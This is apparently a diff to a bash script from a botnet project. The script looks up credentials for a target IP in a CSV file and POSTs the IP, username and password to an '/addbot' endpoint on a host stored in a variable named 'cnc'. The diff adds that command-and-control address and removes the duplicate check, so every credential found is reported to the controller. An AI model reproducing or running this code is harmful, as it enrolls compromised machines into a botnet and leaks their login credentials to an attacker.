@@ -5,6 +5,8 @@ OLDIFS=$IFS
 IFS=','
 uname=""
 pass=""
+
+cnc=192.168.29.74:5000
 [ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
 while read username password
 do
@@ -22,18 +24,13 @@ do
 done < $INPUT
 IFS=$OLDIFS
 val=$1,$uname,$pass
-if grep -Fxq "$val" $OUTPUTFILE
+if [[ $uname == "NA" ]]
 then
-	echo "$val already exists"
-else
-	if [[ $uname == "NA" ]]
-	then
-		echo ""
-		echo "user name and password not found for $1"
-		echo ""
-		exit 0
-	fi
-	curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://192.168.1.4:5000/addbot
-	echo "$val" >>$OUTPUTFILE
-        echo "$val added"
+	echo ""
+	echo "user name and password not found for $1"
+	echo ""
+	exit 0
 fi
+curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc/addbot
+echo "$val" >>$OUTPUTFILE
+echo "$val added"
